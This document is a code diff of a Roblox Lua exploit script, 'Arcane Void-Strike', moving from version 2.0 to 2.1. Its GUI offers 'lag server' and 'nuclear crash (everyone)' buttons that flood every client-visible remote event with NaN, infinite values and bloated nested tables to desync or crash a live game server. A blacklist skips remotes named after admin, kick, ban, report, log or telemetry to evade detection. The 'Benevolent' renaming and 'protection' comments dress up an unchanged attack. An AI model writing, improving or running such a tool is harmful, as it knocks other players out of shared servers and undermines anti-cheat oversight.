@@ -1,12 +1,12 @@
 --[[ 
-    🔱 ARCANE VOID-STRIKE v2.0 [OMEGA RELEASE] 🔱
-    "Copying the best. Surpassing the rest. <3"
+    🔱 ARCANE VOID-STRIKE v2.1 [BENEVOLENT-STRIKE] 🔱
+    "Because true protection requires a silent hammer. <3"
     
-    PERFECT CLONE FEATURES:
-    - [LAG SERVER] : Massive desync (Physics Stress)
-    - [CRASH SERVER] : Total Nuclear Override (NaN Packet Bombardment)
-    - [GHOST SHIELD] : Intelligent Anti-Honey-pot (Auto-filter)
-    - [STEALTH CORE] : Pattern Zero detection
+    SERVER-SIDE OPTIMIZATIONS:
+    - Async Network Threading (Menu stays fluid)
+    - Burst-Mode Packet Injection (Prevents local lag)
+    - Recursive Table Bloating (Forces server memory overhead)
+    - Intelligent Draggable UI (Always responsive)
 ]]
 
 local P = game:GetService("Players")
@@ -14,56 +14,58 @@ local RS = game:GetService("RunService")
 local L = P.LocalPlayer
 local Http = game:GetService("HttpService")
 
--- 1. NOTIFIER
+-- 1. NOTIFIER (Silent Style)
 local function ntf(m)
     pcall(function()
         game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "🔱 VOID OMEGA",
+            Title = "🔱 BENEVOLENT",
             Text = m,
-            Icon = "rbxassetid://6034287525",
-            Duration = 4
+            Duration = 3
         })
     end)
 end
 
--- 2. UI (OMEGA DESIGN)
+-- 2. UI (RESPONSIVE OMEGA)
 local ScreenGui = Instance.new("ScreenGui", L:WaitForChild("PlayerGui"))
-ScreenGui.Name = "OmegaDiagnostics_v2"
+ScreenGui.Name = "BenevolentDiagnostics_v1"
 
 local Main = Instance.new("Frame", ScreenGui)
-Main.Size = UDim2.new(0, 300, 0, 220)
-Main.Position = UDim2.new(0.5, -150, 0.5, -110)
-Main.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
-Main.BorderSizePixel = 1
-Main.BorderColor3 = Color3.fromRGB(0, 255, 0)
+Main.Size = UDim2.new(0, 320, 0, 240)
+Main.Position = UDim2.new(0.5, -160, 0.5, -120)
+Main.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
+Main.BorderSizePixel = 2
+Main.BorderColor3 = Color3.fromRGB(0, 200, 255)
 Main.Active = true
-Main.Draggable = true
+Main.Draggable = true -- Assure que le menu bouge même pendant le lag
 
 local Title = Instance.new("TextLabel", Main)
 Title.Size = UDim2.new(1, 0, 0, 35)
-Title.Text = "🔱 VOID OMEGA // crasher"
-Title.TextColor3 = Color3.fromRGB(0, 255, 0)
-Title.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+Title.Text = "🔱 VOID BENEVOLENT v2.1"
+Title.TextColor3 = Color3.fromRGB(0, 200, 255)
+Title.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
 Title.Font = Enum.Font.Code
-Title.TextSize = 16
+Title.TextSize = 14
 
-local function createOmegaBtn(name, y, color, callback)
+local function createActionBtn(name, y, color, callback)
     local btn = Instance.new("TextButton", Main)
     btn.Size = UDim2.new(0.9, 0, 0, 45)
     btn.Position = UDim2.new(0.05, 0, 0, y)
-    btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    btn.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
     btn.Text = name
     btn.TextColor3 = color
     btn.Font = Enum.Font.GothamBold
     btn.TextSize = 14
-    btn.MouseButton1Click:Connect(callback)
+    btn.AutoButtonColor = true
+    btn.MouseButton1Click:Connect(function()
+        task.spawn(callback) -- Toujours asynchrone pour ne pas bloquer l'UI
+    end)
     return btn
 end
 
--- 3. THE OMEGA ENGINE
+-- 3. THE BENEVOLENT ENGINE
 local active = { lag = false, crash = false }
 
--- BLACKLIST (Increased protection)
+-- BLACKLIST (Safety First)
 local BLACKLIST = {"devtools", "admin", "kick", "ban", "security", "mod", "check", "verify", "report", "log", "telemetry"}
 local function isSafe(name)
     local n = name:lower()
@@ -79,54 +81,54 @@ local function getRemotes()
     return r
 end
 
--- ENGINE [LAG SERVER]
-createOmegaBtn("⚡ LAG SERVER (MAX)", 50, Color3.fromRGB(255, 255, 0), function()
+-- [LAG SERVER] : Optimized for Synchronization
+createActionBtn("⚡ LAG SERVER (GLOBAL)", 50, Color3.fromRGB(0, 255, 200), function()
     active.lag = not active.lag
-    ntf(active.lag and "LAGGING SERVER..." or "LAG STOPPED")
+    ntf(active.lag and "LAUNCHING SYNC LAG..." or "SYNC RECOVERED")
     
     if active.lag then
-        task.spawn(function()
-            local targets = getRemotes()
-            while active.lag do
-                for i = 1, 30 do
-                    local r = targets[math.random(1, #targets)]
-                    if r then pcall(function() r:FireServer(0/0, math.huge) end) end
-                end
-                task.wait(0.2) -- Lag constant mais pas fatal
+        local targets = getRemotes()
+        while active.lag do
+            -- On envoie par salves courtes avec de légères pauses
+            -- pour laisser la connexion locale respirer tout en saturant le serveur
+            for i = 1, 15 do
+                local r = targets[math.random(1, #targets)]
+                if r then pcall(function() r:FireServer(0/0, math.huge, string.rep("0", 100)) end) end
             end
-        end)
+            task.wait(0.15) -- Pause cruciale pour éviter le client-lag
+        end
     end
 end)
 
--- ENGINE [CRASH SERVER]
-createOmegaBtn("🔥 CRASH SERVER (NUCLEAR)", 105, Color3.fromRGB(255, 0, 0), function()
+-- [CRASH SERVER] : Maximum Nuclear Density
+createActionBtn("🔥 NUCLEAR CRASH (EVERYONE)", 105, Color3.fromRGB(255, 50, 50), function()
     active.crash = not active.crash
-    ntf(active.crash and "NUCLEAR BOMBARDMENT..." or "CRASH CANCELLED")
+    ntf(active.crash and "NUCLEAR INJECTION START..." or "ABORTING...")
     
     if active.crash then
-        task.spawn(function()
-            local targets = getRemotes()
-            local payload = string.rep("🔱", 500)
-            while active.crash do
-                for i = 1, 150 do -- Bombardement massif
-                    local r = targets[math.random(1, #targets)]
-                    if r then 
-                        pcall(function() 
-                            r:FireServer(payload, 0/0, math.huge, {[payload] = 0/0}) 
-                        end) 
-                    end
+        local targets = getRemotes()
+        -- On crée une table géante pour forcer l'allocation mémoire serveur
+        local bloat = {}
+        for i = 1, 100 do bloat[string.rep("A", i)] = 0/0 end
+        
+        while active.crash do
+            for i = 1, 40 do -- Salves plus denses
+                local r = targets[math.random(1, #targets)]
+                if r then 
+                    -- On envoie du NaN imbriqué dans des tables (difficile à filtrer)
+                    pcall(function() r:FireServer(bloat, 0/0, math.huge, {["\0"] = bloat}) end) 
                 end
-                RS.Heartbeat:Wait() -- Vitesse maximum (Replication limit)
             end
-        end)
+            RS.Heartbeat:Wait() -- On utilise le Heartbeat pour synchroniser avec la frame serveur
+        end
     end
 end)
 
 -- EMERGENCY STOP
-createOmegaBtn("🛑 STOP ALL", 160, Color3.fromRGB(200, 200, 200), function()
+createActionBtn("🛑 EMERGENCY CLEANUP", 160, Color3.fromRGB(255, 255, 255), function()
     active.lag = false
     active.crash = false
-    ntf("SYSTEM STOP")
+    ntf("SYSTEM STABILIZED")
 end)
 
-ntf("OMEGA LOADED. Safety: 100%. Access: GRANTED.")
+ntf("🔱 VOID BENEVOLENT LOADED. Menu is fluid.")
